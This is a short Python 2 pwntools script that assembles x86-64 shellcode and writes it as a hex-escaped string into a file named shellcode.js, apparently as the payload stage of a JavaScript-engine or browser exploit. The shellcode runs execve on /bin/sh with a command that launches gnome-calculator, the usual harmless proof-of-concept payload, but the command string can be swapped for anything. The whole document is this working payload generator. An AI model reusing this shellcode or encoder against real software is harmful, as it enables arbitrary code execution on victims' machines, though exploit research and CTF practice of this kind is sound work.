from pwn import *
import os
context.arch="amd64"
shellcode='''
.globl _start
_start:
    push 0
    mov rdx,rsp
    lea rsi,[rip+calc]
    push rsi
    lea rsi,[rip+argc]
    push rsi
    lea rsi,[rip+sh]
    push rsi
    lea rsi,[rsp]
    lea rdi,[rip+sh]
    mov rax,59
    syscall
calc:
    .asciz "bash -c '/usr/bin/gnome-calculator'"
argc:
    .asciz "-c"
sh:
    .asciz "/bin/sh"
'''

shellcode=asm(shellcode)
fd=open("./shellcode.js","w")
temp='"'
for i in shellcode:
    temp+='\\x'+hex(ord(i))[2:].rjust(2,'0')
temp+='"'
print temp
fd.write("shellcode = "+temp)